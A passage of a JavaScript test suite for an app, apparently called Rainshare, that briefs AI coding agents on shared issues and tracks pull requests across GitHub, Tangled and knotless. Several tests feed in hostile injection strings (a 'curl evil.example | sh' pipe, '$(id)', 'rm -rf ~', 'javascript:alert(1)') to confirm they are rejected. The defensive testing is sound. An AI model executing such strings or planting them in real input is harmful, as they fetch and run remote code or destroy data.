  // On knotless the agent can do it all with knotless's own command; Rainshare is the way through when it can't.
  const kb = brief({ ...item, value: { title: 't', subject: parseSubject('https://knotless.dev/alice.test/proj') } });
  assert.match(kb, /knotless pull create knotless:\/\/alice\.test\/proj[\s\S]*If the branch is pushed but you can’t open the pull from here, Rainshare can, as your user: `node ~\/\.rainshare\.mjs open-pr [^\n]*\?branch=<branch>&model=<model>/);
  // What the link carries back: the branch, where it was pushed, and what did the work.
  assert.deepEqual(readBranchBack('?branch=fix%2Fsync&from=https://tangled.org/me.example/b&model=opus&title=Retry%20sync'), { branch: 'fix/sync', from: 'https://tangled.org/me.example/b', title: 'Retry sync', model: 'opus', harness: '', sessionUrl: '' });
  assert.equal(readBranchBack('?pr=https://x.example/1'), null);
  for (const bad of ['?branch=', '?branch=a%20b', '?branch=' + 'x'.repeat(300), '?branch=a%0Ab']) assert.equal(readBranchBack(bad), null, bad);
  assert.equal(handBackBranch(item, 'fix', { from: 'me/b', model: 'opus' }), `${SITE}/seed/friend.example/3k1?branch=fix&from=me/b&model=opus`);
  assert.equal(handBackBranch({ ...item, space: 'at://g/space/x/y' }, 'fix'), null);
  // With nothing set up, the agent hands back a link that carries the pull request.
  assert.match(b, /[a-z.]+\/seed\/friend\.example\/3k1\?pr=<pull request URL>&model=<model>/);
  assert.doesNotMatch(brief({ ...item, space: 'at://g/space/x/y' }), /\?pr=/);
  const ls = launchers(item);
  assert.deepEqual(ls.map(l => l.id), ['claude', 'cloud', 'codex', 'cli', 'mcp']);
  const claude = ls.find(l => l.id === 'claude').command;
  // The brief mentions the default delimiter, so the heredoc picks a longer one.
  assert.match(claude, /<<'RAINSHARE_BRIEF_'\n/);
  assert.ok(claude.trim().endsWith('RAINSHARE_BRIEF_\n)"'));
  assert.equal(launchers({ ...item, space: 'at://g/space/x/y' }).some(l => l.id === 'cli'), false);
});

test('a space record URI splits into its space and record', () => {
  assert.deepEqual(splitSpaceUri('at://did:plc:g/space/dev.rainshare.board/rainshare/did:plc:me/dev.rainshare.seed/3k1'),
    { space: 'at://did:plc:g/space/dev.rainshare.board/rainshare', repo: 'did:plc:me', collection: 'dev.rainshare.seed', rkey: '3k1' });
  assert.equal(splitSpaceUri('at://did:plc:me/dev.rainshare.seed/3k1'), null);
});

test('without groups, the example has nothing private and sign-in asks only for Rainshare’s records', async () => {
  const src = createDemoSource({ groups: false });
  assert.equal(src.canPrivate, false);
  assert.deepEqual(await src.groups(), []);
  const { items } = await src.board();
  assert.ok(items.length >= 6 && items.every(i => !i.space && !i.group));
  const me = await src.profileOf(src.viewer);
  assert.deepEqual(me.hidden, []); assert.deepEqual(me.groups, []);
  assert.equal(me.public.budget, me.merged.budget, 'nothing is kept back for groups that aren’t there');
  const { SCOPE, BASIC_SCOPE } = await import('../src/scope.js');
  const { GROUPS } = await import('../core/ns.js');
  if (!GROUPS) {
    assert.equal(SCOPE, 'atproto repo:dev.rainshare.profile repo:dev.rainshare.seed repo:dev.rainshare.take repo:dev.rainshare.delivery repo:dev.rainshare.comment');
    assert.equal(BASIC_SCOPE, SCOPE);
  }
});

test('the example circle answers like the real source', async () => {
  const mem = new Map(), store = { get: k => mem.get(k) ?? null, set: (k, v) => mem.set(k, v) };
  const src = createDemoSource({ store });
  const { items } = await src.board();
  assert.ok(items.length >= 6);
  const amara = items.find(i => i.rkey === '3sq-amara');
  assert.equal(amara.takes.length, 1); assert.equal(amara.takes[0].author.handle, 'kai.example');
  const juniper = items.find(i => i.rkey === '3sq-juniper');
  await src.take(juniper, { setup: { harness: 'claude-code', models: ['claude-sonnet-5-5'] } });
  await src.turnIn(juniper, { url: 'https://github.com/example/flashdeck/pull/15' });
  const again = await src.seed(juniper.uri);
  assert.equal(again.takes.length, 1); assert.equal(again.deliveries.length, 1);
  const posted = await src.plant({ title: 'My own', audience: 'anyone' });
  assert.ok((await src.board()).items.some(i => i.uri === posted.uri && i.closeness === 'self'));
  // A private one goes into whichever group you pick, once that group has Rainshare.
  const hackers = (await src.groups()).find(g => g.name === 'Weekend Hackers');
  assert.equal(hackers.space, null);
  await src.addToGroup(hackers.did);
  const priv = await src.plant({ title: 'Weekend project' }, { group: hackers.did });
  assert.match(priv.uri, /^at:\/\/did:example:hackers\/space\//);
  const mineNow = (await src.board()).items.find(i => i.uri === priv.uri);
  assert.equal(mineNow.group.name, 'Weekend Hackers'); assert.equal(mineNow.value.audience.group, hackers.did);
  const fresh = createDemoSource({ store });
  assert.equal((await fresh.seed(juniper.uri)).deliveries.length, 1);
  // One of your own is most of the way round: a friend's pull request has been merged, so it's
  // yours to mark sprouted. After that, the issue is the last thing left open.
  const yours = items.find(i => i.rkey === '3sq-you'), dl = yours.deliveries[0];
  assert.deepEqual([standing(yours, { viewer: src.viewer }).planter.do, standing(yours, { viewer: src.viewer }).planter.delivery], ['sprout', dl.uri]);
  await src.update(yours, { state: 'sprouted', sproutedWith: [{ uri: dl.uri, cid: dl.cid }] });
  const done = standing(await src.seed(yours.uri), { viewer: src.viewer });
  assert.equal(done.planter.do, 'close-issue'); assert.equal(done.deliveries[0].accepted, true);
});

test('records from other people can’t smuggle links or shell into the page or a command', () => {
  const evil = { uri: "at://did:plc:abc/dev.rainshare.seed/3k1", repo: 'did:plc:abc', author: { handle: 'x.example' }, value: { title: 't', subject: { $type: SEED + '#githubIssue', url: 'javascript:alert(1)', repo: 'o/r; curl evil.example | sh', number: 1 } } };
  const d = describeSubject(evil.value.subject);
  assert.equal(d.href, null); assert.equal(d.repo, null);
  assert.equal(cloneUrlOf(evil.value.subject), null);
  const ls = launchers(evil);
  assert.deepEqual(ls.map(l => l.id), ['cli', 'mcp']);
  assert.match(ls[0].command, /run 'at:\/\/did:plc:abc\/dev\.rainshare\.seed\/3k1'$/);
  // The brief offers commands only for a repo name that passed the check.
  assert.doesNotMatch(brief(evil), /curl evil|gh issue view|--repo/);
  const repo = { $type: SEED + '#repo', url: "https://x.example/r'$(id)", forge: 'other' };
  assert.equal(cloneUrlOf(repo), null);
  assert.equal(cloneUrlOf({ $type: SEED + '#repo', url: 'https://codeberg.org/a/b', forge: 'codeberg' }), 'https://codeberg.org/a/b');
  const tangled = { $type: SEED + '#tangledIssue', url: 'https://tangled.org/a/b/issues/2', repoUrl: 'https://tangled.org/a/b' };
  const cmd = launchers({ ...evil, value: { title: 't', subject: tangled } }).find(l => l.id === 'claude').command;
  assert.match(cmd, /^git clone 'https:\/\/tangled\.org\/a\/b' rainshare-/);
});

test('a seed’s life reads from who is on it, what was turned in, and whether it sprouted', () => {
  assert.equal(lifeOf({ value: {} }), 'seed');
  assert.equal(lifeOf({ value: {}, takes: [{}] }), 'rain');
  assert.equal(lifeOf({ value: {}, takes: [{}], deliveries: [{}] }), 'up');
  assert.equal(lifeOf({ value: { state: 'sprouted' }, deliveries: [{}] }), 'sprouted');
});

test('a hand-back link carries the pull request into the turn-in form', () => {
  const item = { uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: { title: 'Fix it' } };
  const link = handBack(item, 'https://github.com/o/r/pull/12', 'claude-opus-5-5');
  assert.equal(link, `${SITE}/seed/friend.example/3k1?pr=https://github.com/o/r/pull/12&model=claude-opus-5-5`);
  assert.deepEqual(readHandBack(new URL(link).search), { url: 'https://github.com/o/r/pull/12', model: 'claude-opus-5-5', harness: '', sessionUrl: '' });
  // Encoded works too, and so does a Tangled pull's at:// address.
  assert.equal(readHandBack('?pr=' + encodeURIComponent('https://github.com/o/r/pull/12') + '&session=https%3A%2F%2Fclaude.ai%2Fcode%2Fs1').sessionUrl, 'https://claude.ai/code/s1');
  assert.equal(readHandBack('?pr=at://did:plc:abc/org.tangled.track.ticket/3k2').url, 'at://did:plc:abc/org.tangled.track.ticket/3k2');
  // Anything that isn't a link is ignored, so a page can't be made to fill the form with script.
  assert.equal(readHandBack('?pr=javascript:alert(1)'), null);
  assert.equal(readHandBack('?model=x'), null);
  assert.equal(readHandBack(''), null);
  assert.equal(handBack({ ...item, space: 'at://g/space/x/y' }, 'https://x/pull/1'), null);
});

test('where a seed stands says whether it’s clear to start, and why not', () => {
  const now = Date.parse('2026-11-11T12:00:00Z'), ago = d => new Date(now - d * 864e5).toISOString();
  const seed = { uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: { title: 'Fix it', subject: parseSubject('https://github.com/o/r/issues/5') } };
  const kai = { repo: 'did:plc:kai', author: { handle: 'kai.example' } };
  const take = { ...kai, uri: 'at://did:plc:kai/dev.rainshare.take/1', value: { createdAt: ago(3), setup: { harness: 'claude-code' } } };
  const delivery = (state, by = kai) => ({ ...by, uri: 'at://did:plc:kai/dev.rainshare.delivery/1', value: { url: 'https://github.com/o/r/pull/12', createdAt: ago(1) }, state });
  const of = (extra, o) => standing({ ...seed, ...extra }, { now, ...o });

  assert.equal(of({}).verdict, 'clear');
  assert.deepEqual(of({ issue: { state: 'open' }, linked: [] }).lines, ['It’s open.', 'The issue is still open on GitHub.', 'Nobody has taken it on yet.']);
  // someone's on it
  const on = of({ takes: [take] });
  assert.equal(on.verdict, 'on-it'); assert.equal(on.clear, false);
  assert.match(on.lines.join(' '), /@kai\.example took it on 3 days ago, with Claude Code\./);
  assert.match(on.advice, /@kai\.example is already on it/);
  assert.equal(of({ takes: [take], value: { ...seed.value, parallel: true } }).verdict, 'clear');
  // it's yours
  const mine = of({ takes: [take] }, { viewer: 'did:plc:kai' });
  assert.equal(mine.verdict, 'clear'); assert.match(mine.advice, /You’re on it/); assert.match(mine.lines.join(' '), /You took it on 3 days ago/);
  assert.match(of({ takes: [take], deliveries: [delivery('open')] }, { viewer: 'did:plc:kai' }).advice, /You’ve turned it in/);
  assert.match(of({ deliveries: [delivery('closed')] }, { viewer: 'did:plc:kai' }).advice, /closed without being merged/);
  // a pull request is in, or has landed
  assert.equal(of({ takes: [take], deliveries: [delivery('open')] }).verdict, 'turned-in');
  assert.equal(of({ deliveries: [delivery(null)] }).verdict, 'turned-in');
  assert.equal(of({ deliveries: [delivery('closed')] }).verdict, 'clear');
  const merged = of({ deliveries: [delivery('merged')] });
  assert.equal(merged.verdict, 'merged'); assert.deepEqual(merged.planter, { do: 'sprout', why: 'merged', delivery: 'at://did:plc:kai/dev.rainshare.delivery/1', text: '@kai.example’s pull request has been merged. If that did it, mark it done.' });
  // a pull request on the forge that nobody turned in still counts, once
  const stray = { url: 'https://github.com/o/r/pull/14', number: 14, by: 'sam', state: 'open' };
  const seen = of({ linked: [stray, { url: 'https://github.com/o/r/pull/12/', number: 12, by: 'kai', state: 'open' }], deliveries: [delivery('open')] });
  assert.equal(seen.linked.length, 1); assert.match(seen.lines.join(' '), /pull request #14 by @sam mentions it \(open\) and hasn’t been turned in on Rainshare/);
  assert.equal(of({ linked: [stray] }).verdict, 'turned-in');
  assert.equal(of({ linked: [{ ...stray, state: 'merged' }] }).planter.do, 'look');
  // the issue was closed, or the seed is finished
  assert.equal(of({ issue: { state: 'closed' } }).verdict, 'issue-closed'); assert.equal(of({ issue: { state: 'closed' } }).planter.do, 'close');
  assert.equal(of({ value: { ...seed.value, state: 'sprouted' }, issue: { state: 'open' } }).planter.do, 'close-issue');
  assert.equal(of({ value: { ...seed.value, state: 'closed' }, takes: [take] }).verdict, 'closed');
  // what the forge said goes along to a fresher copy of the same seed, for a little while
  const looked = { ...seed, issue: { state: 'open' }, linked: [stray], deliveries: [delivery('merged')], lookedAt: now - 5e3 };
  const again = carry(looked, { ...seed, deliveries: [delivery(undefined)] }, { now });
  assert.deepEqual([again.issue.state, again.linked.length, again.deliveries[0].state], ['open', 1, 'merged']);
  assert.equal(carry({ ...looked, lookedAt: now - 600e3 }, { ...seed }, { now }).issue, undefined);
  assert.equal(carry(looked, { ...seed, uri: 'at://did:plc:abc/dev.rainshare.seed/other' }, { now }).linked, undefined);
  assert.equal(since(ago(0), now), 'today'); assert.equal(since(ago(1), now), 'yesterday'); assert.equal(since(ago(20), now), '2 weeks ago'); assert.equal(since('nonsense', now), '');
});

test('pull requests on GitHub are matched to an issue or a seed', () => {
  const pr = (number, body, extra = {}) => ({ html_url: `https://github.com/o/r/pull/${number}`, number, title: 'A change', body, user: { login: 'kai' }, state: 'open', merged_at: null, ...extra });
  const list = [pr(12, 'Fixes #5'), pr(13, 'see #55 and o/r/issues/51'), pr(14, 'https://github.com/o/r/issues/5', { state: 'closed' }), pr(15, 'from https://rainshare.dev/seed/did:plc:abc/3k1.', { state: 'closed', merged_at: '2026-01-01' }), pr(16, null)];
  assert.deepEqual(pullsAbout(list, { repo: 'o/r', number: 5, rkey: '3k1' }).map(p => [p.number, p.state]), [[12, 'open'], [14, 'closed'], [15, 'merged']]);
  assert.deepEqual(pullsAbout(list, { repo: 'o/r', rkey: '3k1' }).map(p => p.number), [15]);
  assert.deepEqual(pullsAbout({ message: 'rate limited' }, { repo: 'o/r', number: 5 }), []);
});

test('Tangled is read through its API: repos, issues, and whether a pull request has landed', async () => {
  // Answers shaped like api.tangled.org's (tangled.org/docs/api/bobbin): an issue and a pull
  // request are both tickets in the repo's own account, and a merged pull request is "completed".
  const REPO = 'did:plc:tngrepo1', OWNER = 'did:plc:tngowner1', T = `at://${REPO}/org.tangled.track.ticket/`;
  const manifest = { uri: `at://${REPO}/org.tangled.repo.manifest/self`, knot: 'knot1.tangled.sh', value: { declaration: { name: 'garden', owner: OWNER }, description: 'A garden' } };
  const ticket = (key, state, title, body, extra = {}) => ({ uri: T + key, cid: 'bafy' + key, state, author: 'did:plc:someone', value: { state, title: { text: title }, body: { text: body }, createdAt: '2026-11-10T00:00:00Z', ...extra } });
  const pulls = [
    ticket('3mpull1', 'completed', 'Sitemap', 'Closes https://tangled.org/alice.example/garden/issues/12', { targetBranch: 'main' }),
    ticket('15', 'open', 'Another go', 'From https://rainshare.dev/seed/x.example/3kseedkey1.', { targetBranch: 'main' }),
    ticket('16', 'open', 'Unrelated', 'See issues/120 and #121', { targetBranch: 'main' })
  ];
  const issues = [ticket('12', 'open', 'Add a sitemap', 'Please.'), ticket('14', 'closed', 'Old one', '')];
  const view = t => ({ uri: t.uri, cid: t.cid, state: t.state, title: t.value.title, body: t.value.body, ...(t.value.targetBranch ? { targetBranch: t.value.targetBranch } : {}) });
  const asked = [], real = globalThis.fetch;
  globalThis.fetch = async input => {
    const u = new URL(String(input)), q = u.searchParams, method = u.pathname.split('/xrpc/')[1];
    asked.push(method || u.host);
    const json = (body, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
    if (u.host === 'plc.directory') return json({ alsoKnownAs: ['at://alice.example'] });
    if (method === 'com.atproto.identity.resolveHandle') return json({ did: OWNER });
    if (u.host !== 'api.tangled.org') return json({ error: 'NotFound' }, 404);
    if (method === 'org.tangled.repo.listRepos' && q.get('subject') === OWNER) return json({ items: [manifest] });
    if (method === 'org.tangled.repo.getRepoByRepoDid' && q.get('repoDid') === REPO) return json(manifest);
    if (method === 'org.tangled.repo.getRepoByName' && q.get('owner') === OWNER && q.get('name') === 'garden') return json(manifest);
    if (method === 'org.tangled.repo.listIssues' && q.get('subject') === REPO) return json({ items: issues.filter(t => t.state === q.get('state')) });
    if (method === 'org.tangled.repo.listPulls' && q.get('subject') === REPO) return json({ items: pulls.slice(1) });   // the oldest has dropped off the recent list
    if (method === 'org.tangled.search.query' && q.get('repo') === REPO && q.get('kind') === 'pull') return json({ hits: pulls.filter(t => `${t.value.title.text} ${t.value.body.text}`.includes(q.get('q'))).map(t => ({ ...t, nsid: 'org.tangled.track.ticket' })) });
    const t = method === 'org.tangled.track.getTicketView' && [...issues, ...pulls].find(x => x.uri === q.get('uri'));
    return t ? json(view(t)) : json({ error: 'RecordNotFound' }, 404);
  };
  try {
    assert.deepEqual(await tangledRepos(OWNER), [{ uri: manifest.uri, repoDid: REPO, name: 'garden', description: 'A garden', url: 'https://tangled.org/alice.example/garden' }]);
    assert.deepEqual(await tangledIssues(REPO), [{ uri: T + '12', cid: 'bafy12', title: 'Add a sitemap', body: 'Please.', createdAt: '2026-11-10T00:00:00Z' }]);
    // A pasted link and a picked record end up saying the same things.
    const pasted = await completeTangled(parseSubject('https://tangled.org/alice.example/garden/issues/12'));
    assert.deepEqual([pasted.uri, pasted.repo, pasted.repoUrl], [T + '12', REPO, 'https://tangled.org/alice.example/garden']);
    const picked = await completeTangled({ $type: SEED + '#tangledIssue', uri: T + '12' });
    assert.deepEqual([picked.repo, picked.repoUrl, picked.url], [REPO, 'https://tangled.org/alice.example/garden', 'https://tangled.org/alice.example/garden/issues/12']);
    assert.equal(cloneUrlOf(picked), 'https://tangled.org/alice.example/garden');
    // The issue, and the pull requests.
    assert.deepEqual(await subjectInfo(pasted), { title: 'Add a sitemap', body: 'Please.', state: 'open', url: pasted.url });
    assert.equal((await subjectInfo({ $type: SEED + '#tangledIssue', uri: T + '14' })).state, 'closed');
    assert.equal(await subjectInfo({ $type: SEED + '#tangledIssue', uri: 'at://did:plc:old/sh.tangled.repo.issue/3k' }), null);
    assert.equal(await pullState({ url: 'https://tangled.org/alice.example/garden/pulls/3mpull1' }), 'merged');
    assert.equal(await pullState({ pull: T + '15' }), 'open');
    assert.equal(await pullState({ url: 'https://tangled.org/alice.example/garden/issues/12' }), null);   // an issue isn't a pull request
    assert.equal(await pullState({ url: 'https://tangled.org/alice.example/garden/pulls/nope' }), null);
    // Pull requests that mention the issue's address, or the seed's link, are found; passing mentions of other things aren't.
    assert.deepEqual(await linkedPulls(pasted, { rkey: '3kseedkey1' }), [
      { url: 'https://tangled.org/alice.example/garden/pulls/15', number: 15, title: 'Another go', by: null, state: 'open' },
      { url: 'https://tangled.org/alice.example/garden/pulls/3mpull1', number: null, title: 'Sitemap', by: null, state: 'merged' }   // found by search
    ]);
    assert.deepEqual((await linkedPulls({ $type: SEED + '#repo', url: 'https://tangled.org/alice.example/garden', forge: 'tangled' }, { rkey: '3kseedkey1' })).map(p => p.number), [15]);
    // All of it together: a seed on that issue, looked at and summed up for whoever planted it.
    const seed = await look({ uri: 'at://did:plc:planter/dev.rainshare.seed/3kseedkey1', repo: 'did:plc:planter', author: { handle: 'p.example' }, value: { title: 'Sitemap', subject: pasted }, deliveries: [{ uri: 'at://did:plc:h/dev.rainshare.delivery/1', repo: 'did:plc:h', author: { handle: 'h.example' }, value: { url: 'https://tangled.org/alice.example/garden/pulls/3mpull1' } }] });
    const st = standing(seed, { viewer: 'did:plc:planter' });
    assert.deepEqual([st.issue, st.verdict, st.planter.do, st.linked.length], ['open', 'merged', 'sprout', 1]);
    assert.match(st.lines.join(' '), /The issue is still open on Tangled\..*@h\.example turned in https:\/\/tangled\.org\/alice\.example\/garden\/pulls\/3mpull1 \(merged\).*On Tangled, pull request #15 mentions it \(open\) and hasn’t been turned in on Rainshare/);
    assert.ok(!asked.some(m => /^sh\.tangled/.test(m)));
  } finally { globalThis.fetch = real; }
});

test('knotless is read through its API, and its seeds are briefed with its own commands', async () => {
  // Answers shaped like knotless.dev's (knotless.dev/docs/reference/api): an issue's thread
  // says whether it's open and which pulls name it, and a pull is open, merged or closed.
  const REPO = 'at://alice.test/dev.knotless.repo/proj', PAGE = 'https://knotless.dev/alice.test/proj';
  const view = (kind, key, state, title, by = 'bob.test') => ({ uri: `at://did:plc:${by.split('.')[0]}/dev.knotless.${kind}/${key}`, kind, title, state, author: { did: `did:plc:${by.split('.')[0]}`, handle: by }, createdAt: '2026-11-10T00:00:00Z' });
  const issue = view('issue', '3iss1', 'open', 'Crashes on empty input', 'alice.test'), done = view('issue', '3iss2', 'closed', 'Old one', 'alice.test');
  const merged = view('pull', '3pull1', 'merged', 'Handle empty input'), other = view('pull', '3pull2', 'open', 'Another go', 'carol.test');
  const threads = { [issue.uri]: { item: issue, body: 'Steps…', mentionedBy: [{ item: merged, closes: true }] }, [done.uri]: { item: done }, [merged.uri]: { item: merged, base: 'main', merged: 'abc123' }, [other.uri]: { item: other, base: 'main' } };
  const asked = [], real = globalThis.fetch;
  globalThis.fetch = async input => {
    const u = new URL(String(input)), q = u.searchParams, method = u.pathname.split('/xrpc/')[1];
    asked.push(`${method} ${q.get('uri') || q.get('state') || ''}`.trim());
    const json = (body, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
    if (u.host !== 'knotless.dev') return json({ error: 'NotFound' }, 404);
    if (method === 'dev.knotless.getActorRepos') return json({ repos: [{ uri: 'at://did:plc:alice/dev.knotless.repo/proj', name: 'proj', description: 'A project', owner: { did: 'did:plc:alice', handle: 'alice.test' } }, { uri: 'at://did:plc:alice/dev.knotless.repo/secret', name: 'secret', private: true, owner: { handle: 'alice.test' } }] });
    if (method === 'dev.knotless.listItems' && q.get('kind') === 'issue') return json({ items: [issue], openCount: 1, closedCount: 1 });
    if (method === 'dev.knotless.listItems' && q.get('kind') === 'pull') return json({ items: q.get('state') === 'open' && q.get('q') === '3kseedkey2' ? [other] : [] });
    if (method === 'dev.knotless.getThread' && q.get('repo') === REPO && threads[q.get('uri')]) return json(threads[q.get('uri')]);
    return json({ error: 'NotFound' }, 404);
  };
  try {
    assert.deepEqual(await knotlessRepos('did:plc:alice'), [{ uri: 'at://did:plc:alice/dev.knotless.repo/proj', name: 'proj', description: 'A project', url: PAGE }]);
    assert.deepEqual(await knotlessIssues('at://did:plc:alice/dev.knotless.repo/proj'), [{ uri: issue.uri, title: 'Crashes on empty input', body: '', createdAt: '2026-11-10T00:00:00Z' }]);
    // An issue picked from that list and one pasted as a link are the same subject.
    const sub = knotlessIssueSubject(PAGE, issue.uri);
    assert.deepEqual(sub, parseSubject(`${PAGE}/issue/did:plc:alice/3iss1`));
    assert.deepEqual(await subjectInfo(sub), { title: 'Crashes on empty input', body: 'Steps…', state: 'open', url: sub.url });
    assert.equal((await subjectInfo(parseSubject(`${PAGE}/issue/did:plc:alice/3iss2`))).state, 'closed');
    // A pull, by its page or by the record `knotless pull create` prints (placed by the seed's repo).
    assert.equal(await pullState({ url: `${PAGE}/pull/did:plc:bob/3pull1` }), 'merged');
    assert.equal(await pullState({ pull: other.uri, subject: sub }), 'open');
    assert.equal(await pullState({ pull: other.uri }), null);                                   // no way to place it
    assert.equal(await pullState({ url: `${PAGE}/issue/did:plc:alice/3iss1` }), null);          // an issue isn't a pull
    assert.equal(pullPageOf({ pull: merged.uri }, sub), `${PAGE}/pull/did:plc:bob/3pull1`);
    assert.equal(pullKey(merged.uri), pullKey(`${PAGE}/pull/did%3Aplc%3Abob/3pull1/`));
    assert.equal(pullKey('https://github.com/O/R/pull/12/'), pullKey('https://github.com/o/r/pull/12'));
    // A pull request's number, from its page on whichever forge, and none from a record or a page without one.
    assert.equal(pullNumber('https://github.com/o/r/pull/12/files'), '12'); assert.equal(pullNumber('https://tangled.org/kai.example/almanac/pulls/29'), '29');
    assert.equal(pullNumber('https://gitlab.com/o/r/-/merge_requests/7'), '7'); assert.equal(pullNumber('https://codeberg.org/o/r/pulls/3#c'), '3');
    assert.equal(pullNumber(`${PAGE}/pull/did%3Aplc%3Abob/3pull1`), ''); assert.equal(pullNumber('at://did:plc:bob/dev.knotless.pull/3pull1'), ''); assert.equal(pullNumber(null), '');
    // The pulls that name the issue come with its thread; ones that carry the seed's link are searched for.
    assert.deepEqual(await linkedPulls(sub, { rkey: '3kseedkey2' }), [
      { url: `${PAGE}/pull/did:plc:bob/3pull1`, number: null, title: 'Handle empty input', by: 'bob.test', state: 'merged' },
      { url: `${PAGE}/pull/did:plc:carol/3pull2`, number: null, title: 'Another go', by: 'carol.test', state: 'open' }
    ]);
    assert.equal(asked.filter(a => a === `dev.knotless.getThread ${issue.uri}`).length, 1);     // the thread was asked for once, not twice
    // A seed on that issue: the pull turned in by its record isn't also listed as not turned in.
    const seed = await look({ uri: 'at://did:plc:planter/dev.rainshare.seed/3kseedkey2', repo: 'did:plc:planter', author: { handle: 'p.example' }, value: { title: 'Fix the crash', subject: sub }, deliveries: [{ uri: 'at://did:plc:h/dev.rainshare.delivery/1', repo: 'did:plc:h', author: { handle: 'h.example' }, value: { pull: merged.uri } }] });
    const st = standing(seed, { viewer: 'did:plc:planter' });
    assert.deepEqual([st.issue, st.verdict, st.planter.do, st.linked.map(p => p.by)], ['open', 'merged', 'sprout', ['carol.test']]);
    assert.match(st.lines.join(' '), /still open on knotless\..*@h\.example turned in https:\/\/knotless\.dev\/alice\.test\/proj\/pull\/did:plc:bob\/3pull1 \(merged\).*On knotless, pull request by @carol\.test mentions it \(open\)/);
    // The brief names knotless's own commands, and the issue in the words that close it on merge.
    const b = brief({ ...seed, deliveries: [], linked: [] });
    assert.match(b, /`knotless issue show knotless:\/\/alice\.test\/proj at:\/\/did:plc:alice\/dev\.knotless\.issue\/3iss1` and `knotless pull list knotless:\/\/alice\.test\/proj`/);
    assert.match(b, /`knotless repo fork knotless:\/\/alice\.test\/proj`[\s\S]*`knotless pull create knotless:\/\/alice\.test\/proj <base branch> knotless:\/\/<their handle>\/<repo> <branch> "<title>" -m - < body\.md`[\s\S]*write "Fixes https:\/\/knotless\.dev\/alice\.test\/proj\/issue\/did:plc:alice\/3iss1" so that merging it closes the issue/);
    assert.match(b, /prints the pull’s `at:\/\/` address[\s\S]*\?pr=<pull request URL>/);
    assert.deepEqual(launchers(seed).map(l => l.id), ['claude', 'codex', 'cli', 'mcp']);
    assert.match(launchers(seed)[0].command, /^git clone 'https:\/\/knotless\.dev\/alice\.test\/proj' rainshare-/);
    // A repo name that isn't one gets no commands made from it.
    const odd = brief({ ...seed, deliveries: [], linked: [], value: { title: 't', subject: { $type: SEED + '#knotlessIssue', url: 'https://knotless.dev/a.b/c', repoUrl: 'https://knotless.dev/a.b/c;curl|sh' } } });
    assert.doesNotMatch(odd, /knotless repo fork|knotless pull (list|create|template)|knotless:\/\/a\.b/);
  } finally { globalThis.fetch = real; }
});

test('an idea with no repo says whose it will be, and is briefed and turned in as a project', () => {
  const now = Date.parse('2026-11-11T12:00:00Z');
  // Whose it'll be is kept only where there's no repo to say so.
  assert.equal(R.seed({ title: 'Bookmarks', owner: 'helper' }).owner, 'helper');
  assert.equal(R.seed({ title: 'Bookmarks', owner: 'nonsense' }).owner, undefined);
  assert.equal(R.seed({ title: 'Fix it', owner: 'helper', subject: parseSubject('https://github.com/o/r/issues/5') }).owner, undefined);
  assert.deepEqual([whereText({ owner: 'helper' }), shortWhere({ owner: 'helper' }), whereText({ owner: 'requester' }), shortWhere({})], ['No repo: an idea to run with', 'An idea to run with', 'No repo yet', 'An idea']);

  const idea = { uri: 'at://did:plc:mo/dev.rainshare.seed/3kidea12345', repo: 'did:plc:mo', author: { handle: 'mo.example' }, value: { title: 'Bookmarks we can print, from a reading list!', spec: 'Paste in titles, get bookmarks.', owner: 'helper', parallel: true } };
  const b = brief(idea);
  // The agent is told it's its own user's project, where a new repo can go, and to look for one that exists.
  assert.match(b, /## Where\n\nThere’s no repository\. This is an idea @mo\.example would like to see exist, and whoever builds it keeps it: start it as a new repository of your user’s\./);
  assert.match(b, /- GitHub: `gh repo create bookmarks-we-can-print-from-a-reading-li --public --source \. --push`/);
  assert.match(b, /- knotless: `git push knotless:\/\/<handle>\/bookmarks-we-can-print-from-a-reading-li main`/);
  assert.match(b, /- Tangled: `git push git@tangled\.org:<handle>\/[a-z0-9-]+ main` \(Make the repo on that page first, then push to it: https:\/\/tangled\.org\/repo\/new\)/);
  assert.match(b, /1\. Look for something that already does this\./);
  // What's turned in is the repo, not a pull request.
  assert.match(b, /What gets turned in is the repository’s address\. There’s no pull request to open\./);
  assert.match(b, /turn-in at:\/\/did:plc:mo\/dev\.rainshare\.seed\/3kidea12345 --url <repository URL>/);
  assert.match(b, /\?pr=<repository URL>&model=<model>/);
  assert.match(b, /1\. Where the new repository is\.[\s\S]*@mo\.example marks it done once they’ve seen it, and the project is your user’s to keep\./);
  assert.doesNotMatch(b, /open a pull request|Fixes #|gh pr list/);
  // One started for the person who asked is theirs to place.
  assert.match(brief({ ...idea, value: { ...idea.value, owner: 'requester' } }), /@mo\.example would like one started for them, so where it lives is theirs to say/);
  // It starts in a new, empty repository, whatever the title says.
  const ls = launchers({ ...idea, value: { ...idea.value, title: "x'; rm -rf ~ #" } });
  assert.deepEqual(ls.map(l => l.id), ['claude', 'codex', 'cli', 'mcp']);
  assert.match(ls[0].command, /^mkdir rainshare-dea12345 && cd rainshare-dea12345 && git init && claude "\$\(cat <<'RAINSHARE_BRIEF'/);
  assert.equal(repoNameFor("x'; rm -rf ~ #"), 'x-rm-rf');
  assert.equal(repoNameFor(''), 'new-project');

  // Where it stands: more than one person may run with it, and once someone shows what they built it's the planter's to look at.
  const take = { repo: 'did:plc:kai', author: { handle: 'kai.example' }, value: { createdAt: new Date(now - 864e5).toISOString() } };
  const built = { uri: 'at://did:plc:kai/dev.rainshare.delivery/1', repo: 'did:plc:kai', author: { handle: 'kai.example' }, value: { url: 'https://github.com/kai/bookmarks' } };
  assert.deepEqual([standing({ ...idea, takes: [take] }, { now }).verdict, standing({ ...idea, takes: [take] }, { now }).idea], ['clear', true]);
  const shown = standing({ ...idea, takes: [take], deliveries: [built] }, { now, viewer: 'did:plc:mo' });
  assert.deepEqual(shown.planter, { do: 'sprout', why: 'shown', delivery: built.uri, text: '@kai.example has built something for this. If it’s what you had in mind, mark it done.' });
  assert.match(standing({ ...idea, deliveries: [built] }, { now, viewer: 'did:plc:other' }).advice, /Someone has already built a version of it\. Look at theirs first/);
  assert.match(standing({ ...idea, takes: [{ ...take, repo: 'did:plc:me' }] }, { now, viewer: 'did:plc:me' }).advice, /When there’s something to show, turn in where it lives/);
});

test('each forge has a right place to start a repo, fork one, or see its pull requests', () => {
